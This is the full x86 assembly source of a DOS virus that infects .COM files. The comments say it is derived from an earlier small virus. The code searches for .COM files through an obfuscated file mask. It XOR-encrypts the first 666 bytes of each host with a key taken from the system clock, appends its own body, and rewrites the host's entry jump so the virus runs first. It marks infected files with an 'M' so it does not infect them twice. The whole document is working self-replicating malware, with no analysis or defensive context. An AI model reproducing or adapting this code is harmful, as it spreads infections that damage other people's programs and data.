;This virus encrypts the first 666 bytes of the host
;Its based off of the small virus

CSEG	SEGMENT
	ASSUME	CS:CSEG, DS:CSEG

		ORG	100h

		JUMPS

Virus_Length	equ	End_Virus-Begin_Virus

Start:
		jmp	Begin_Virus
		db	700 dup (90h)

Begin_Virus:
		call	Delta

Delta:
		pop	bp
		sub	bp,offset Delta
		push	si
		push	si

		call	Crypt

		mov	ah,1ah
		lea	dx,[bp+DTA]
		int	21h

		xor	word ptr [bp+OldBytes],0deadh
		xor	word ptr [bp+OldBytes+2],0a55h

		pop	di
		lea	si,[bp+OldBytes]
		movsw
		movsw

		mov	ah,4eh
		mov	cx,7h
		lea	dx,[bp+ComMask]

Find_Next:
		call	Dec_
		int	21h
		call	Inc_
		jc	Return

		cmp	word ptr [bp+DTA+1ah],1024
		jb	Find_Next_

		mov	ax,3d02h
		lea	dx,[bp+DTA+1eh]
		int	21h

		xchg	ax,bx

		mov	ah,3fh
		mov	cx,4
		lea	dx,[bp+OldBytes]
		int	21h

		cmp	byte ptr [bp+OldBytes],'M'
		je	Close_Find_Next

		xor	word ptr [bp+OldBytes],0deadh
		xor	word ptr [bp+OldBytes+2],0a55h

		call	Move_Begin

		mov	ah,3fh
		mov	cx,666
		lea	dx,[bp+HostBuffr]
		push	dx
		int	21h

		mov	ah,2ch
		int	21h
		mov	word ptr [bp+Key],dx

		pop	si

		call	Crypt
		call	Move_Begin

		mov	ah,40h
		mov	cx,666
		lea	dx,[bp+HostBuffr]
		int	21h

		mov	ax,4202h
		call	Move_Fp

		sub	ax,4
		mov	word ptr [bp+NewBytes+2],ax

		mov	ah,40h
		mov	cx,Virus_Length
		lea	dx,[bp+Begin_Virus]
		int	21h

		mov	ax,4200h
		call	Move_Begin

		mov	ah,40h
		mov	cx,4
		lea	dx,[bp+NewBytes]
		int	21h

Close_Find_Next:
		mov	ah,3eh
		int	21h

Find_Next_:
		mov	ah,4fh
		jmp	Find_Next

Dec_:
		mov	cx,5
		lea	si,[bp+ComMask]
		mov	di,si
Dec_Loop:
		lodsb
		dec	al
		stosb
		loop	Dec_Loop
		xor	al,al
		stosb
		ret

Inc_:
		mov	cx,5
		lea	si,[bp+ComMask]
		mov	di,si
Inc_Loop:
		lodsb
		inc	al
		stosb
		loop	Inc_Loop
		mov	al,"6"
		stosb
		ret

;ComMask	db	"*.COM",0
ComMask		db	"+/DPN6"
NewBytes	db	"M",0e9h,0,0
;OldBytes	db	0cdh,20h,0,0
OldBytes	dw	0fe60h
		dw	0a55h

Move_Begin:
		mov	ax,4200h

Move_Fp:
		xor	cx,cx
		cwd
		int	21h
		ret

Return:
		mov	ah,1ah
		mov	dx,80h
		int	21h
		ret

Crypt:
		push	bx
		mov	cl,4
		mov	dx,word ptr [bp+Key]
		ror	dx,cl
		mov	cx,333
		mov	di,si
Xor_Loop:
		lodsw
		xor	ax,dx
		stosw
		loop	Xor_Loop
		pop	bx
		ret

Key		dw	0000h

End_Virus:
DTA		db	42 dup (?)
HostBuffr	db	666 dup (?)

CSEG	ENDS
	END	START
